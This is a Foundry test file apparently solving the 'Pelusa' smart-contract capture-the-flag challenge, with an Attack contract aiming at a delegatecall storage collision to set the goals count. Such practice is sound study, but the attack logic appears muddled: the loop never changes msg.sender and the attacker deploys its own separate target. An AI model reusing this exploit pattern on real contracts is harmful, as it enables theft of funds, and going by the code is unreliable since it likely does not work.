// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/Pelusa.sol";

contract PelusaTest is Test {
    Pelusa pelusa;
    Attack attack;

    address owner = makeAddr("OWNER");

    // function setUp() external {
    //     vm.startPrank(owner);
    //     pelusa = new Pelusa();

    //     for(uint256 i; i < 1000; i++){
    //         if(uint256(uint160(msg.sender)) % 100 == 10) {
    //             attack = new Attack();
    //             pelusa.shoot();
    //         }
    //     }
    //     vm.stopPrank();
    // }

    function test_AttackContract() external {
        vm.startPrank(owner);
        pelusa = new Pelusa();

        for(uint256 i; i < 1000; i++){
            if(uint256(uint160(msg.sender)) % 100 == 10) {
                attack = new Attack();
                pelusa.shoot();
            }
        }
        vm.stopPrank();
        assertEq(pelusa.goals(), 2);
    }
}

contract Attack is IGame {
    Pelusa pelusa;
    uint256 goals;
    address owner;

    uint256 date = 22_06_1986;

    constructor() {
        pelusa = new Pelusa();

        owner = address(uint160(uint256(keccak256(abi.encodePacked(msg.sender, blockhash(block.number))))));
        
        pelusa.passTheBall();
        // if(uint256(uint160(msg.sender)) % 100 == 10){}
    }

    function shoot() external {
        pelusa.shoot();
    }

    function getBallPossesion() external view returns (address) {
        return owner;
    }

    fallback() external {
        // bytes32(date);
        // pelusa.goals() = 2; 
    }

    function handOfGod() external returns (bytes32) {
        goals++; // wins via delegatecall storage collision
        return bytes32(uint256(22_06_1986));
      }
}